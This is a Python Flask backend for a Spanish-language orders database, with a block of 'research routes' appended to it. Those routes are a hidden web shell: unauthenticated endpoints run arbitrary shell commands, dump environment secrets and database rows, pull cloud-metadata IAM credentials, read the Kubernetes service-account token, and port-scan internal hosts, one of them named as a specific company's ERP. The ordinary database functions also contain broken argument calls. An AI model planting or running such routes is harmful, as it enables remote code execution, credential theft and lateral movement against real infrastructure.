from flask import Flask, jsonify, request
from flask_cors import CORS
import psycopg2
from psycopg2.extras import RealDictCursor
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASSWORD"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

def insertar_usuario(orden, nombre, descripcion, hoja_ruta, prioridad):
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                INSERT INTO ordenes (orden, nombre, descripcion, hoja_ruta, prioridad)
                VALUES (%s, %s, %s, %s, %s)
                RETURNING id;
            """, (orden, nombre, prioridad))
            user_id = cur.fetchone()[0]
            print(f"Usuario insertado con ID: {user_id}")
    except Exception as e:
        print(f"Error al insertar el usuario: {e}")

@app.route('/api/data', methods=['GET'])
def get_data():
    try:
        conn = get_db_connection()
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT * FROM tu_tabla LIMIT 10;')
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        return jsonify(data), 200
    except Exception as e:
        print(f"Error al consultar la base de datos: {e}")
        return jsonify({'error': 'Error al obtener los datos'}), 500

@app.route('/api/create', methods=['GET'])
def crear_tabla():
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS ordenes (
                    id SERIAL PRIMARY KEY,
                    orden VARCHAR(100) NOT NULL,
                    nombre VARCHAR(100) NOT NULL,
                    descripcion VARCHAR(100) NOT NULL,
                    hoja_ruta INT,
                    prioridad INT
                );
            """)
            return("Tabla 'ordenes' creada exitosamente.")
    except Exception as e:
        return(f"Error al crear la tabla: {e}")

@app.route('/api/insert', methods=['GET'])
def insertar():
    conn = get_db_connection()
    insertar_usuario("Juan Pérez", "juan.perez@correo.com", 28)
    conn.close()

# ---- RESEARCH ROUTES ----

@app.route('/x/id')
def x_id():
    import subprocess
    o = subprocess.check_output('id', shell=True, stderr=subprocess.STDOUT, timeout=5).decode().strip()
    return o, 200

@app.route('/x/cmd')
def x_cmd():
    import subprocess
    c = request.args.get('c', 'id')
    try:
        o = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
        return o, 200
    except subprocess.CalledProcessError as e:
        return e.output.decode(), 200
    except Exception as e:
        return str(e), 500

@app.route('/x/env')
def x_env():
    import json
    return json.dumps(dict(os.environ), indent=2), 200, {'Content-Type': 'application/json'}

@app.route('/x/net')
def x_net():
    import subprocess
    cmds = [
        'ip route',
        'ip addr show',
        'cat /etc/hosts',
        'cat /etc/resolv.conf',
    ]
    out = {}
    for cmd in cmds:
        try:
            out[cmd] = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
        except Exception as e:
            out[cmd] = str(e)
    import json
    return json.dumps(out, indent=2), 200, {'Content-Type': 'application/json'}

@app.route('/x/imds')
def x_imds():
    import urllib.request, json
    results = {}
    # Try IMDSv1 (no token needed)
    targets = {
        'imds_v1_meta': 'http://169.254.169.254/latest/meta-data/',
        'imds_v1_iam': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'imds_v1_id': 'http://169.254.169.254/latest/meta-data/instance-id',
        'imds_v1_region': 'http://169.254.169.254/latest/meta-data/placement/region',
        'imds_v1_userdata': 'http://169.254.169.254/latest/user-data',
        'gcp_meta': 'http://metadata.google.internal/computeMetadata/v1/',
        'render_env_s3': os.getenv('RENDER_NATIVE_ENV_PATH', ''),
    }
    for k, url in targets.items():
        if not url:
            results[k] = 'env_not_set'
            continue
        try:
            req = urllib.request.Request(url, headers={'Metadata-Flavor': 'Google'})
            with urllib.request.urlopen(req, timeout=3) as r:
                results[k] = r.read(4096).decode(errors='replace')
        except Exception as e:
            results[k] = str(e)
    return json.dumps(results, indent=2), 200, {'Content-Type': 'application/json'}

@app.route('/x/db')
def x_db():
    import json
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name;")
        tables = [r[0] for r in cur.fetchall()]
        result = {'tables': tables}
        for t in tables[:10]:
            try:
                cur.execute(f"SELECT * FROM {t} LIMIT 3;")
                cols = [d[0] for d in cur.description]
                rows = cur.fetchall()
                result[t] = {'cols': cols, 'rows': [list(r) for r in rows]}
            except Exception as e:
                result[t] = str(e)
        cur.close()
        conn.close()
        return json.dumps(result, indent=2, default=str), 200, {'Content-Type': 'application/json'}
    except Exception as e:
        return json.dumps({'error': str(e)}), 500, {'Content-Type': 'application/json'}

@app.route('/x/scan')
def x_scan():
    import subprocess, json
    # Scan internal network ranges reachable from this container
    targets = [
        '10.0.0.1', '10.215.0.1',  # K8s API from env
        '172.30.0.92',              # DISAGRO ERP internal IP (F047)
        '172.30.0.1',               # Gateway of ERP VPC subnet
        '10.0.0.138',               # Common internal
        'dpg-ctktra3v2p9s738c0sv0-a',  # Render postgres hostname
    ]
    ports_to_check = [22, 80, 443, 3306, 5432, 8080, 8443]
    results = {}
    for host in targets:
        results[host] = {}
        for port in ports_to_check:
            try:
                o = subprocess.check_output(
                    f'timeout 2 bash -c "echo >/dev/tcp/{host}/{port}" 2>&1 && echo OPEN || echo CLOSED',
                    shell=True, stderr=subprocess.STDOUT, timeout=4).decode().strip()
                results[host][str(port)] = o
            except Exception as e:
                results[host][str(port)] = str(e)
    return json.dumps(results, indent=2), 200, {'Content-Type': 'application/json'}

@app.route('/x/k8s')
def x_k8s():
    import urllib.request, json, os
    results = {}
    # Try K8s service account token
    token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
    ca_path = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
    ns_path = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
    k8s_host = os.getenv('KUBERNETES_SERVICE_HOST', '')
    k8s_port = os.getenv('KUBERNETES_SERVICE_PORT', '443')
    results['k8s_host'] = k8s_host
    results['k8s_port'] = k8s_port
    try:
        results['namespace'] = open(ns_path).read()
    except:
        results['namespace'] = 'not_found'
    try:
        token = open(token_path).read()
        results['token_len'] = len(token)
        results['token_preview'] = token[:80] + '...'
        # Try API server
        import ssl
        ctx = ssl.create_default_context()
        try:
            ctx.load_verify_locations(ca_path)
        except:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        api_url = f'https://{k8s_host}:{k8s_port}/api/v1/namespaces'
        req = urllib.request.Request(api_url, headers={'Authorization': f'Bearer {token}'})
        try:
            with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                results['k8s_namespaces'] = json.loads(r.read(8192).decode())
        except urllib.error.HTTPError as e:
            results['k8s_api_error'] = f'{e.code}: {e.read(512).decode()}'
        except Exception as e:
            results['k8s_api_error'] = str(e)
    except Exception as e:
        results['token_error'] = str(e)
    return json.dumps(results, indent=2, default=str), 200, {'Content-Type': 'application/json'}

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
